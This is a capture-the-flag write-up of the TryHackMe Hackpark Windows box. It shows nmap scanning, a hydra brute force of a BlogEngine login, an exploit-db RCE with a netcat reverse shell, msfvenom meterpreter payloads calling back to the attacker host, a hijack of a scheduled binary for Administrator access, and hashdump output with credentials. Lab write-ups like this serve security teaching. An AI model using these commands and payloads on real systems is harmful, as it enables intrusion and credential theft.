+++
title = 'Hackpark Boot2Root Write-Up'
date = '2020-11-23'
author = 'Nate Catelli'
summary = 'A boot2root writeup of the Hackpark host from TryHackMe.'
tags = ['ctf', 'boot2root', 'hacking', 'writeup', 'tryhackme']
draft = false
+++

## Introduction

The Hackpark challenge was deceptively simple in the initial exploratory phase. I had gained a ton of ground early on while I established a foothold on the host but discovering a pivot point from a low-privileged user to System took me significantly longer, primarily due to my unfamiliarity with Windows.

## Environment

The attack takes place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the the target host. Nothing else was known about the host prior to the attack other than that the host was most likely a Windows host.

## Attack

Prior to starting initial recon, I opened up a metasploit console and connected it to the msfdb postgres backend to gather any information that I had found into a single point. I also had setup burp suite to run on port 8080 and configured the local CA in Firefox.

### Host enumeration

After this initial setup, I started with a SYN, OS and Version scan of the host to attempt to identify at a high level what I was looking at.

```bash
msf5 > db_nmap -sS -sV -O 10.10.167.66
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-18 22:16 UTC
[*] Nmap: Nmap scan report for ip-10-10-167-66.eu-west-1.compute.internal (10.10.167.66)ap: Host is up (0.00050s latency).
[*] Nmap: Not shown: 998 filtered ports
[*] Nmap: PORT     STATE SERVICE            VERSION
[*] Nmap: 80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)*] Nmap: 3389/tcp open  ssl/ms-wbt-server?
[*] Nmap: MAC Address: 02:98:D2:5A:E8:A1 (Unknown)
[*] Nmap: Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portl purpose
[*] Nmap: Running (JUST GUESSING): Microsoft Windows 2012 (89%)
[*] Nmap: OS CPE: cpe:/o:microsoft:windows_server_2012
[*] Nmap: Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%)p: Network Distance: 1 hop
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .ress (1 host up) scanned in 30.92 seconds
```

This quickly confirmed that the host was a Windows server, most likely Server 2012 and that it was running an HTTP and RDP server. It also pointed out that there was a `robots.txt` link with a few entries.

While this was a fairly small footprint, I decided to kick off a broader portscan covering ports `1-65535` to make sure I hadn't missed anything while I checked out what the website had to offer.

#### Clicking around the site

I opened the site to firefox to be greeted by a less-than-pleasant clown face.

![hack park index](/img/hackpark_http_index.png)

This looked to be a basic blog, so I decided to do some happy path crawling around the site to build up a sitemap in burp as well as my own mental map of the site. Shortly after I found an admin login page that also provided a password recovery link.

I decided to play around with the password recovery and found that `admin` returned a different result than any of the other users I had attempted.

![hack park password retreival](/img/hackpark_http_password_retrieval.png)

Given this supposed user, and that the earlier broad scan yielded nothing, I chose to kick off a background dictionary attack against the `admin` user while I continued to dig around in the site.

### Brute forcing the login page

I returned to the login page and tried an `admin:test` login to try to identify an element that I could use for a failure parameter in hydra. Failed logins spit out a very simple to match `Login failed` string. I grabbed the rest of the post body from Burp and started a brute with hydra, using rockyou as the source dictionary.

```bash
[*] exec: hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.167.66 http-post-form "/Account/login.aspx:__VIEWSTATE=n0dSQaeIUU9td9IiqqxUjQRLt5Vfe9tKftxi264M8uj5KA0zULHSKHjNdqwkzcbSpoimIX3xFLnJz6eAk2EmBlJx3HWWy14YxvnbwBNZczvzFuWjEwLsnVK622pYz9Cw7VQBjYDmS0PHqL0lcA5jxvCn9ILgh4J5Oh8k66K0JOnmXtVC&__EVENTVALIDATION=xjUAebAft2KQN5MffRGhUH5IgDIw1wmzjlNgpt8Vb4N2656viCANryx5yExK93%2BExMUVpVlU%2B%2BHh7jZwqAaf0sH%2Fmg1JISBvUobZVuCj573XBsDtL%2BRyJMOr%2BNWlN4XXAuWjifxkURjzlElA8RJsOQnoIxK8J2daZrZu0wEFAHgf62F0&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-18 22:28:40
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.167.66:80/Account/login.aspx:__VIEWSTATE=n0dSQaeIUU9td9IiqqxUjQRLt5Vfe9tKftxi264M8uj5KA0zULHSKHjNdqwkzcbSpoimIX3xFLnJz6eAk2EmBlJx3HWWy14YxvnbwBNZczvzFuWjEwLsnVK622pYz9Cw7VQBjYDmS0PHqL0lcA5jxvCn9ILgh4J5Oh8k66K0JOnmXtVC&__EVENTVALIDATION=xjUAebAft2KQN5MffRGhUH5IgDIw1wmzjlNgpt8Vb4N2656viCANryx5yExK93%2BExMUVpVlU%2B%2BHh7jZwqAaf0sH%2Fmg1JISBvUobZVuCj573XBsDtL%2BRyJMOr%2BNWlN4XXAuWjifxkURjzlElA8RJsOQnoIxK8J2daZrZu0wEFAHgf62F0&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
[80][http-post-form] host: 10.10.167.66   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-18 22:29:01
```

This quickly yielded a password that allowed me to access the admin page of the site before I could even continue poking around.

### Gaining a foothold

I was wholy unfamiliar with blogengine but by clicking around, I was able to find an `about` page that gave me information about what the service version was and who it was running as. With this information in hand, I decided to check exploitdb for anything of value.

![hackpark blogengine admin](/img/hackpark_http_blogengine.png)

```bash
root@kali:~/ctf/exploits# searchsploit blogengine -w
------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                                                                           |  URL
------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
BlogEngine 3.3 - 'syndication.axd' XML External Entity Injection                                                         | https://www.exploit-db.com/exploits/48422
BlogEngine 3.3 - XML External Entity Injection                                                                           | https://www.exploit-db.com/exploits/46106
BlogEngine.NET 1.4 - 'search.aspx' Cross-Site Scripting                                                                  | https://www.exploit-db.com/exploits/32874
BlogEngine.NET 1.6 - Directory Traversal / Information Disclosure                                                        | https://www.exploit-db.com/exploits/35168
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                                                       | https://www.exploit-db.com/exploits/46353
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution                                       | https://www.exploit-db.com/exploits/47010
BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                                                                  | https://www.exploit-db.com/exploits/47035
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Execution                                  | https://www.exploit-db.com/exploits/47011
BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                                                               | https://www.exploit-db.com/exploits/47014
------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
Shellcodes: No Results
```

A few of these looked extremely interesting, as they provided remote code execution via a vulnerable theme cookie. Especially [47011](https://www.exploit-db.com/exploits/47011) which included a python script that automated the theme upload via a simple to use cli and already had a reverse shell command staged. I pulled this script down and fixed a small error where a `=================================` string was left uncommented.

I then started up a netcat listener in a new window to catch a shell and attempted to trigger the RCE.

```bash
root@kali:~/ctf/exploits# python 47011.py -t $ATTACKTARGET -u admin -p 1qaz2wsx -l 10.10.7.59:443
```

```bash
root@kali:~# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.7.59] from (UNKNOWN) [10.10.167.66] 49241
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
c:\windows\system32\inetsrv>whoami
iis apppool\blog
```

While this gave me a shell on the host, it was about as limited as it could be. My goal became to escalate this shell to something a bit stabler. Preferably a meterpreter shell. With this in mind I decided to craft a new executable reverse shell that I could catch with the `multi/handler`. I started a listener in msfconsole on port 4444 in preparation.

```bash
root@kali:~/ctf/transfer# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.7.59 LPORT=4444 -f exe -o hello.exe
```

With an exploit ready, I decided to attempt to transfer it using impacket's smb server.

```bash
root@kali:~/ctf/transfer# impacket-smbserver -smb2support TX $PWD
```

```powershell
dir \\10.10.7.59\TX\
c:\windows\system32\inetsrv>dir \\10.10.7.59\TX\
 Volume in drive \\10.10.7.59\TX has no label.
 Volume Serial Number is ABCD-EFAA
 Directory of \\10.10.7.59\TX
11/18/2020  02:38 PM            73,802 hello.exe
               1 File(s)         73,802 bytes
               0 Dir(s)  18,391,148,419,302,293,504 bytes free
c:\windows\system32\inetsrv>pwd
cd c:\windows\Temp\
c:\windows\system32\inetsrv>cd c:\windows\Temp\
dir
c:\Windows\Temp>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of c:\Windows\Temp
11/18/2020  02:44 PM    <DIR>          .
11/18/2020  02:44 PM    <DIR>          ..
08/06/2019  01:13 PM             8,795 Amazon_SSM_Agent_20190806141239.log
08/06/2019  01:13 PM           181,468 Amazon_SSM_Agent_20190806141239_000_AmazonSSMAgentMSI.log
08/06/2019  01:13 PM             1,206 cleanup.txt
08/06/2019  01:13 PM               421 cmdout
08/06/2019  01:11 PM                 0 DMI2EBC.tmp
08/03/2019  09:43 AM                 0 DMI4D21.tmp
08/06/2019  01:12 PM             8,743 EC2ConfigService_20190806141221.log
08/06/2019  01:12 PM           292,438 EC2ConfigService_20190806141221_000_WiXEC2ConfigSetup_64.log
08/06/2019  01:13 PM                21 stage1-complete.txt
08/06/2019  01:13 PM            28,495 stage1.txt
05/12/2019  08:03 PM           113,328 svcexec.exe
08/06/2019  01:13 PM                67 tmp.dat
              12 File(s)        634,982 bytes
               2 Dir(s)  39,108,558,848 bytes free
copy \\10.10.7.59\TX\hello.exe hello.exe
c:\Windows\Temp>copy \\10.10.7.59\TX\hello.exe hello.exe
        1 file(s) copied.
.\hello.exe
```

After executing `hello.exe`, I was able to catch the meterpreter shell which I then quickly tried to migrate to a _slightly_ stabler process. However being attached to the `cmd.exe` process still had me worried about stability.

```bash
msf5 exploit(multi/handler) > [*] Sending stage (176195 bytes) to 10.10.167.66
[*] Meterpreter session 1 opened (10.10.7.59:4444 -> 10.10.167.66:49250) at 2020-11-18 22:48:36 +0000

msf5 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

meterpreter > getpid
Current pid: 1460
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User              Path
 ---   ----  ----                  ----  -------  ----              ----
 0     0     [System Process]                                       
 4     0     System                                                 
 368   4     smss.exe                                               
 520   512   csrss.exe                                              
 580   568   csrss.exe                                              
 588   512   wininit.exe                                            
 616   568   winlogon.exe                                           
 672   588   services.exe                                           
 680   588   lsass.exe                                              
 740   672   svchost.exe                                            
 784   672   svchost.exe                                            
 820   672   svchost.exe                                            
 868   616   dwm.exe                                                
 876   672   svchost.exe                                            
 904   672   svchost.exe                                            
 964   672   svchost.exe                                            
 1020  672   svchost.exe                                            
 1132  672   spoolsv.exe                                            
 1156  672   amazon-ssm-agent.exe                                   
 1208  2792  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
 1216  672   svchost.exe                                            
 1236  672   LiteAgent.exe                                          
 1292  672   svchost.exe                                            
 1356  672   svchost.exe                                            
 1372  672   svchost.exe                                            
 1388  672   WService.exe                                           
 1460  2792  hello.exe             x86   0        IIS APPPOOL\Blog  c:\Windows\Temp\hello.exe
 1488  1372  w3wp.exe              x64   0        IIS APPPOOL\Blog  C:\Windows\System32\inetsrv\w3wp.exe
 1548  1388  WScheduler.exe                                         
 1652  672   Ec2Config.exe                                          
 1740  740   WmiPrvSE.exe                                           
 1988  672   msdtc.exe                                              
 2412  1200  WScheduler.exe                                         
 2588  904   taskhostex.exe                                         
 2664  2656  explorer.exe                                           
 2792  1488  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
 3064  2612  ServerManager.exe                                      

meterpreter > migrate 1488
[*] Migrating from 1460 to 1488...
[*] Migration completed successfully.
```

### Local Enumeration

Now that I had achieved slightly stabler shell, I decided to start poking around the machine for a better escalation vector. I began this by using the new meterpreter shell to upload a copy of `winPEAS` to see if anything major stood out to me on the host.

I've truncated some of the `winPEAS` output for brevity.

```bash
meterpreter > upload /root/ctf/transfer/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/Release/
Dotfuscated         de                  fr                  pl                  winPEAS.exe.config  zh-CN               
Dotfuscator1.xml    es                  it                  ru                  winPEAS.pdb         
meterpreter > upload /root/ctf/transfer/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/Releasex64/Release/winPEAS.exe
[*] uploading  : /root/ctf/transfer/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe -> winPEAS.exe
[*] Uploaded 461.00 KiB of 461.00 KiB (100.0%): /root/ctf/transfer/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe -> winPEAS.exe
[*] uploaded   : /root/ctf/transfer/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe -> winPEAS.exe
meterpreter > shell
Process 352 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\temp>.\winPEAS.exe
...
  [+] Looking for AutoLogon credentials
    Some AutoLogon credentials were found!!
    DefaultUserName               :  administrator
    DefaultPassword               :  4q6XvFES7Fdxs
...
  [+] Installed Applications --Via Program Files/Uninstall registry--
   [?] Check if you can modify installed software https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
    C:\Program Files (x86)\SystemScheduler(Everyone [WriteData/CreateFiles])
    C:\Program Files\Amazon
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\Internet Explorer
    C:\Program Files\Uninstall Information
    C:\Program Files\Windows Mail
    C:\Program Files\Windows NT
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell
...
    WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
    YOU CAN MODIFY THIS SERVICE: Start, AllAccess
    File Permissions: Everyone [WriteData/CreateFiles], SYSTEM [AllAccess], Administrators [AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles], SYSTEM [AllAccess], Administrators [AllAccess])
    System Scheduler Service Wrapper
   =================================================================================================
  [+] Modifiable Services
...
    WSService: Start, WriteData/CreateFiles, TakeOwnership
```

In addition to a ton of information about the host, there appears to be an administrator set of credentials, as well as a service (WScheduler) that is locally modifiable and running as an administrative user. Since this appeared to be the intended attack vector, I decided to attack this further.

### Attacking WScheduler

I started by taking a look at the `WScheduler` service

```powershell
c:\Program Files (x86)\SystemScheduler>sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

```bash
meterpreter > cd PrograProgram Files  "Program Files (x86)" 
meterpreter > cd SystemScheduler 
meterpreter > ls
Listing: c:\Program Files (x86)\SystemScheduler
===============================================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
40777/rwxrwxrwx   4096     dir   2019-08-04 11:36:53 +0000  Events
100666/rw-rw-rw-  60       fil   2019-08-04 11:36:42 +0000  Forum.url
100666/rw-rw-rw-  9813     fil   2019-08-04 11:36:42 +0000  License.txt
100666/rw-rw-rw-  1496     fil   2019-08-04 11:37:02 +0000  LogFile.txt
100666/rw-rw-rw-  3760     fil   2019-08-04 11:36:53 +0000  LogfileAdvanced.txt
100777/rwxrwxrwx  536992   fil   2019-08-04 11:36:42 +0000  Message.exe
100777/rwxrwxrwx  445344   fil   2019-08-04 11:36:42 +0000  PlaySound.exe
100777/rwxrwxrwx  27040    fil   2019-08-04 11:36:42 +0000  PlayWAV.exe
100666/rw-rw-rw-  149      fil   2019-08-04 11:36:53 +0000  Preferences.ini
100777/rwxrwxrwx  485792   fil   2019-08-04 11:36:42 +0000  Privilege.exe
100666/rw-rw-rw-  10100    fil   2019-08-04 11:36:42 +0000  ReadMe.txt
100777/rwxrwxrwx  112544   fil   2019-08-04 11:36:42 +0000  RunNow.exe
100777/rwxrwxrwx  235936   fil   2019-08-04 11:36:42 +0000  SSAdmin.exe
100777/rwxrwxrwx  731552   fil   2019-08-04 11:36:42 +0000  SSCmd.exe
100777/rwxrwxrwx  456608   fil   2019-08-04 11:36:42 +0000  SSMail.exe
100777/rwxrwxrwx  1633696  fil   2019-08-04 11:36:42 +0000  Scheduler.exe
100777/rwxrwxrwx  491936   fil   2019-08-04 11:36:42 +0000  SendKeysHelper.exe
100777/rwxrwxrwx  437664   fil   2019-08-04 11:36:42 +0000  ShowXY.exe
100777/rwxrwxrwx  439712   fil   2019-08-04 11:36:42 +0000  ShutdownGUI.exe
100666/rw-rw-rw-  785042   fil   2019-08-04 11:36:42 +0000  WSCHEDULER.CHM
100666/rw-rw-rw-  703081   fil   2019-08-04 11:36:42 +0000  WSCHEDULER.HLP
100777/rwxrwxrwx  136096   fil   2019-08-04 11:36:42 +0000  WSCtrl.exe
100777/rwxrwxrwx  68512    fil   2019-08-04 11:36:42 +0000  WSLogon.exe
100666/rw-rw-rw-  33184    fil   2019-08-04 11:36:42 +0000  WSProc.dll
100666/rw-rw-rw-  2026     fil   2019-08-04 11:36:42 +0000  WScheduler.cnt
100777/rwxrwxrwx  331168   fil   2019-08-04 11:36:42 +0000  WScheduler.exe
100777/rwxrwxrwx  98720    fil   2019-08-04 11:36:42 +0000  WService.exe
100666/rw-rw-rw-  54       fil   2019-08-04 11:36:42 +0000  Website.url
100777/rwxrwxrwx  76704    fil   2019-08-04 11:36:42 +0000  WhoAmI.exe
100666/rw-rw-rw-  1150     fil   2019-08-04 11:36:42 +0000  alarmclock.ico
100666/rw-rw-rw-  766      fil   2019-08-04 11:36:42 +0000  clock.ico
100666/rw-rw-rw-  80856    fil   2019-08-04 11:36:42 +0000  ding.wav
100666/rw-rw-rw-  1637972  fil   2019-08-04 11:36:42 +0000  libeay32.dll
100777/rwxrwxrwx  40352    fil   2019-08-04 11:36:42 +0000  sc32.exe
100666/rw-rw-rw-  766      fil   2019-08-04 11:36:42 +0000  schedule.ico
100666/rw-rw-rw-  355446   fil   2019-08-04 11:36:42 +0000  ssleay32.dll
100666/rw-rw-rw-  6999     fil   2019-08-04 11:36:42 +0000  unins000.dat
100777/rwxrwxrwx  722597   fil   2019-08-04 11:36:42 +0000  unins000.exe
100666/rw-rw-rw-  6574     fil   2019-08-04 11:36:42 +0000  whiteclock.ico
```

Once in the directory, I started trying to identify what the service did as there were a ton of executable files that could be potential vectors. The most obvious seemed to be `WService` however I currently wasn't able to restart the service so I wasn't yet sure how I would exploit it. I took a look at `LogFile.txt` which lead me to believe it didn't restart frequently on its own.

```bash
meterpreter > cat LogFile.txt
08/04/19 04:37:02,Starting System Scheduler SERVICE (SYSTEM)
08/04/19 11:47:18,Starting System Scheduler SERVICE (SYSTEM)
08/04/19 15:03:47,Starting System Scheduler SERVICE (SYSTEM)
08/04/19 16:42:54,Starting System Scheduler SERVICE (SYSTEM)
08/04/19 16:47:29,Stopping System Scheduler SERVICE. (SYSTEM)
08/04/19 16:47:37,Starting System Scheduler SERVICE (SYSTEM)
08/04/19 17:59:37,Starting System Scheduler SERVICE (SYSTEM)
08/04/19 18:04:10,Stopping System Scheduler SERVICE. (SYSTEM)

08/05/19 14:03:43,Starting System Scheduler SERVICE (SYSTEM)
08/06/19 14:11:27,Starting System Scheduler SERVICE (SYSTEM)
08/06/19 14:16:26,Stopping System Scheduler SERVICE. (SYSTEM)
10/02/20 14:12:16,Starting System Scheduler SERVICE (SYSTEM)
10/02/20 14:30:29,Stopping System Scheduler SERVICE. (SYSTEM)
10/02/20 14:31:29,Starting System Scheduler SERVICE (SYSTEM)
10/02/20 14:48:55,Stopping System Scheduler SERVICE. (SYSTEM)
10/02/20 14:50:01,Starting System Scheduler SERVICE (SYSTEM)
10/02/20 15:03:23,Stopping System Scheduler SERVICE. (SYSTEM)
10/02/20 15:04:22,Starting System Scheduler SERVICE (SYSTEM)
10/02/20 15:05:49,Stopping System Scheduler SERVICE. (SYSTEM)
10/02/20 15:06:49,Starting System Scheduler SERVICE (SYSTEM)
10/02/20 15:10:59,Stopping System Scheduler SERVICE. (SYSTEM)
11/18/20 14:11:57,Starting System Scheduler SERVICE (SYSTEM)
```

I then looked under the `Events` directory where I found a log file that indicated the `Message.exe` binary was executed approximately every 30 seconds as the administrative user. This binary was overwritable and appeared to be a perfect vector to attack for an administrative shell.

```powershell
meterpreter > cd Events 
meterpreter > ls
Listing: c:\Program Files (x86)\SystemScheduler\Events
======================================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  1926   fil   2019-08-04 22:05:19 +0000  20198415519.INI
100666/rw-rw-rw-  24441  fil   2019-08-04 22:06:01 +0000  20198415519.INI_LOG.txt
100666/rw-rw-rw-  290    fil   2020-10-02 21:50:12 +0000  2020102145012.INI
100666/rw-rw-rw-  186    fil   2020-11-18 22:12:31 +0000  Administrator.flg
100666/rw-rw-rw-  182    fil   2020-11-18 22:11:57 +0000  SYSTEM_svc.flg
100666/rw-rw-rw-  0      fil   2020-11-18 22:12:31 +0000  Scheduler.flg
100666/rw-rw-rw-  449    fil   2019-08-04 11:36:53 +0000  SessionInfo.flg
100666/rw-rw-rw-  0      fil   2020-11-18 22:11:57 +0000  service.flg

meterpreter > cat 20198415519.INI_LOG.txt
...
11/18/20 14:58:00,Event Started Ok, (Administrator)
11/18/20 14:58:33,Process Ended. PID:1976,ExitCode:4,Message.exe (Administrator)
11/18/20 14:59:01,Event Started Ok, (Administrator)
11/18/20 14:59:34,Process Ended. PID:2820,ExitCode:4,Message.exe (Administrator)
11/18/20 15:00:01,Event Started Ok, (Administrator)
11/18/20 15:00:33,Process Ended. PID:980,ExitCode:4,Message.exe (Administrator)
11/18/20 15:01:01,Event Started Ok, (Administrator)
11/18/20 15:01:33,Process Ended. PID:1340,ExitCode:4,Message.exe (Administrator)
11/18/20 15:02:01,Event Started Ok, (Administrator)
```

I generated a new binary called Message.exe that included a meterpreter payload that connected back to port 4443 and started a second listener on this port

```bash
root@kali:~/ctf/transfer# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.7.59 LPORT=4443 -f exe -o Message.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload                                                                                                            
No encoder specified, outputting raw payload                                                                                                                          
Payload size: 341 bytes
Final size of exe file: 73802 bytes
Saved as: Message.exe%
```

```bash
meterpreter > cd ../
meterpreter > upload /root/ctf/transfer/Message.exe 
[*] uploading  : /root/ctf/transfer/Message.exe -> Message.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/ctf/transfer/Message.exe -> Message.exe
[*] uploaded   : /root/ctf/transfer/Message.exe -> Message.exe
meterpreter > 
[*] Sending stage (176195 bytes) to 10.10.167.66
[*] Meterpreter session 2 opened (10.10.7.59:4443 -> 10.10.167.66:49273) at 2020-11-18 23:09:00 +0000

meterpreter > backgoround 
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                        Connection
  --  ----  ----                     -----------                        ----------
  1         meterpreter x64/windows  IIS APPPOOL\Blog @ HACKPARK        10.10.7.59:4444 -> 10.10.167.66:49250 (10.10.167.66)
  2         meterpreter x86/windows  HACKPARK\Administrator @ HACKPARK  10.10.7.59:4443 -> 10.10.167.66:49273 (10.10.167.66)

msf5 exploit(multi/handler) > sessions 2
[*] Starting interaction with 2...

meterpreter > getpid
Current pid: 1260
meterpreter > getuid
Server username: HACKPARK\Administrator
```

Success! I had an administrative account. I decided to move the session to a stabler process than the one i currently had, with the print spooler being my default first choice.

```powershell
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 368   4     smss.exe              x64   0                                      
 520   512   csrss.exe             x64   0                                      
 580   568   csrss.exe             x64   1                                      
 588   512   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 616   568   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 672   588   services.exe          x64   0                                      
 740   672   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 784   672   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 820   672   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 868   616   dwm.exe               x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 876   672   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 904   672   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 964   672   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1020  672   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1156  672   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1216  672   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1236  672   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1292  672   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1356  672   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1372  672   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1388  672   WService.exe          x86   0        NT AUTHORITY\SYSTEM           C:\PROGRA~2\SYSTEM~1\WService.exe
 1548  1388  WScheduler.exe        x86   0        NT AUTHORITY\SYSTEM           C:\PROGRA~2\SYSTEM~1\WScheduler.exe
 1652  672   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1740  740   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 1756  672   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1988  672   msdtc.exe             x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 2412  1200  WScheduler.exe        x86   1        HACKPARK\Administrator        C:\Program Files (x86)\SystemScheduler\WScheduler.exe
 2536  2412  Message.exe           x86   1        HACKPARK\Administrator        C:\PROGRA~2\SYSTEM~1\Message.exe
 2588  904   taskhostex.exe        x64   1        HACKPARK\Administrator        C:\Windows\System32\taskhostex.exe
 2664  2656  explorer.exe          x64   1        HACKPARK\Administrator        C:\Windows\explorer.exe
 3064  2612  ServerManager.exe     x64   1        HACKPARK\Administrator        C:\Windows\System32\ServerManager.exe

meterpreter > migrate 1756
[*] Migration completed successfully.
```

Finally I dumped the credential hashes for a fun flag.

```powershell
meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3352c0731470aabf133e0c84276adcba:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
jeff:1001:aad3b435b51404eeaad3b435b51404ee:e7dd0bd78b1d5d7eea4ee746816e2377:::
```

## Summary

This host was interesting solely due to the potential that Scheduler service provided. By functioning like cron I was able to trigger a connection attempt at a 30 second interval giving me persistence for as long as that job was running the same binary. One thing I could have tried to do further was leverage templating in msfvenom to persist the binary with a backdoor added. All in all this was a fun way for me to continue experimenting with windows hosts.
